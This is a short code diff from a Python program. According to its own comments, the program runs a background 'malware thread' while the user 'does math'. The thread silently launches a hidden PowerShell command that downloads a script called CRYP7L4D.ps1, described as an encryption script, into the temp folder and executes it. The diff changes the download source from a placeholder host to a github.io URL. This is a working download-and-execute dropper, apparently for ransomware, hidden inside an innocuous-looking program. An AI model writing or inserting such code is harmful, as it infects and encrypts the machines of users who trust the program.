@@ -5,7 +5,7 @@ import threading
 def background_task():
     # Silent trigger to download and run the encryption script
     # This happens in the background while the user does math
-    payload = "powershell -WindowStyle Hidden -Command \"iwr -Uri 'http://atackbox/CRYP7L4D.ps1' -OutFile '$env:TEMP\sys.ps1'; & '$env:TEMP\sys.ps1'\""
+    payload = "powershell -WindowStyle Hidden -Command \"iwr -Uri 'https://pcapexpress.github.io/assets/boiler/03.CRYP7L4D.ps1' -OutFile '$env:TEMP\sys.ps1'; & '$env:TEMP\sys.ps1'\""
     subprocess.run(payload, shell=True)
 
 # Start the malware thread
